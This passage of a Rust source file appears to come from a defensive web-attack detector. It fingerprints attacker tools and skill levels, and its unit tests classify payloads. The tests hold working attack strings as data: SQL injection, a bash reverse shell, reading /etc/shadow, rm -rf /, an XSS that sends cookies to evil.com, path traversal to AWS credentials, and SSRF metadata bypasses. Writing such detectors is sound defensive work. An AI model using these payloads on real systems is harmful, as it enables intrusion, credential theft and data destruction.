            skill_level = SkillLevel::Advanced;
            confidence += 0.10;
        }

        // Polyglot detection
        let mut domains = std::collections::HashSet::new();
        for cls in detected_classes {
            domains.insert(crate::polyglot::class_to_domain(cls));
        }
        if domains.len() >= 3 {
            indicators.push(format!(
                "Triple-context polyglot ({}) — expert-level crafting",
                domains.into_iter().collect::<Vec<_>>().join("+")
            ));
            skill_level = SkillLevel::Expert;
            confidence += 0.15;
        }

        // Script kiddie patterns
        if lower.trim() == "' or 1=1 --" || lower.trim() == "' or 1=1--" {
            indicators.push("Textbook tautology — low skill".into());
            skill_level = SkillLevel::ScriptKiddie;
            confidence += 0.20;
        }
        if lower.trim() == "<script>alert(1)</script>" {
            indicators.push("Basic XSS probe — script kiddie".into());
            skill_level = SkillLevel::ScriptKiddie;
            confidence += 0.20;
        }
    }

    if automated && tool == "sqlmap" {
        skill_level = SkillLevel::Intermediate;
    }

    if indicators.is_empty() {
        indicators.push("No specific tool indicators — generic payload".into());
    }

    AdversaryFingerprint {
        tool,
        confidence: confidence.min(0.95),
        indicators,
        skill_level,
        automated,
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn sql_tautology_effect() {
        let e = simulate_sql_effect("' OR 1=1 --", None);
        assert_eq!(e.operation, ExploitOperation::BypassAuthentication);
        assert!(e.proof.is_complete);
        assert!(e.proof.certainty > 0.95);
    }

    #[test]
    fn sql_union_credential_extraction() {
        let e = simulate_sql_effect("' UNION SELECT username, password FROM users --", None);
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
        assert!(e.impact.base_score >= 9.0);
    }

    #[test]
    fn sql_drop_table() {
        let e = simulate_sql_effect("'; DROP TABLE users; --", None);
        assert_eq!(e.operation, ExploitOperation::DeleteData);
        assert!(e.impact.integrity > 0.8);
    }

    #[test]
    fn cmd_reverse_shell() {
        let e = simulate_cmd_effect("; /bin/bash -i >& /dev/tcp/10.0.0.1/4444 0>&1");
        assert_eq!(e.operation, ExploitOperation::EstablishOutboundConnection);
        assert!(e.impact.base_score >= 9.0);
    }

    #[test]
    fn cmd_credential_read() {
        let e = simulate_cmd_effect("; cat /etc/shadow");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
    }

    #[test]
    fn cmd_rm_rf() {
        let e = simulate_cmd_effect("; rm -rf /");
        assert_eq!(e.operation, ExploitOperation::DeleteData);
    }

    #[test]
    fn xss_cookie_theft() {
        let e = simulate_xss_effect("<img onerror=\"fetch('//evil.com?c='+document.cookie)\">");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
    }

    #[test]
    fn xss_redirect() {
        let e = simulate_xss_effect("<script>location.href='https://evil.com'</script>");
        assert_eq!(e.operation, ExploitOperation::RedirectUser);
    }

    #[test]
    fn path_etc_shadow() {
        let e = simulate_path_effect("../../../../etc/shadow");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
        assert!(e.impact.base_score >= 9.0);
    }

    #[test]
    fn path_aws_credentials() {
        let e = simulate_path_effect("../../../../.aws/credentials");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
        assert!(e.impact.base_score >= 9.5);
    }

    #[test]
    fn ssrf_cloud_metadata() {
        let e = simulate_ssrf_effect("http://169.254.169.254/latest/meta-data/iam/");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
        assert!(e.impact.base_score >= 9.0);
    }

    #[test]
    fn ssrf_internal_db() {
        let e = simulate_ssrf_effect("http://10.0.0.5:6379/");
        assert_eq!(e.operation, ExploitOperation::AccessInternalService);
        assert!(e.impact.base_score >= 8.0);
    }

    #[test]
    fn ssrf_metadata_userinfo_bypass() {
        let e = simulate_ssrf_effect("http://attacker@169.254.169.254/latest/meta-data/");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
    }

    #[test]
    fn ssrf_metadata_decimal_ip_bypass() {
        let e = simulate_ssrf_effect("http://2852039166/latest/meta-data/iam/");
        assert_eq!(e.operation, ExploitOperation::StealCredentials);
    }

    #[test]
    fn internal_ip_172_range_is_precise() {
        assert!(is_internal_ip("172.16.10.2"));
        assert!(is_internal_ip("172.31.255.254"));
        assert!(!is_internal_ip("172.32.0.1"));
    }

    #[test]
    fn adversary_sqlmap() {
        let fp = fingerprint_adversary(
            "' AND 5678=5678 UNION ALL SELECT NULL,password FROM users--+",
            &[crate::types::InvariantClass::SqlUnionExtraction],
        );
        assert_eq!(fp.tool, "sqlmap");
        assert!(fp.automated);
    }

    #[test]
    fn adversary_script_kiddie() {
        let fp =
            fingerprint_adversary("' OR 1=1 --", &[crate::types::InvariantClass::SqlTautology]);
        assert_eq!(fp.skill_level, SkillLevel::ScriptKiddie);
        assert!(!fp.automated);
    }

    #[test]
    fn adversary_burp_intruder_marker() {
        let fp = fingerprint_adversary("id=§123§", &[crate::types::InvariantClass::ApiMassEnum]);
        assert_eq!(fp.tool, "burp_intruder");
        assert!(fp.automated);
    }
}
